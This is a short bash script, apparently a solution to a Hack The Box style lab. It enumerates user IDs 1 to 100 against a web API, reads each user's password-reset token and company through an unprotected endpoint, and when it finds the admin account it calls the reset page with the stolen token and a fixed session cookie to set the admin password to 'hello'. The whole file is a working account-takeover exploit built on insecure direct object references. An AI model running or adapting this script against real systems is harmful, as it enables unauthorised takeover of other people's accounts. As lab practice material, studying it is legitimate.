#!/bin/bash

url="http://64.227.32.21:31430"

for id in {1..100};do
    # getting token
    token=$(curl -s -X GET "$url/api.php/token/$id"|jq -r .token)
    user_name=$(curl -s -X GET "$url/api.php/user/$id"|jq -r .username)
    company=$(curl -s -X GET "$url/api.php/user/$id"|jq -r .company)

    # resetting password
        echo ""
        echo "user ID:$id ,User token: $token, user: $user_name, company: $company"

        # change admin pass to hello
        if [ $user_name == "htb-admin" ] || [[ $company == "Administrator" ]];then
        curl -s -k -X GET -H "Cookie: PHPSESSID=a84v9q47caeot6tcg57b2svm43; uid=$id" "$url/reset.php?uid=$id&token=$token&password=hello"
        exit 0
        fi

done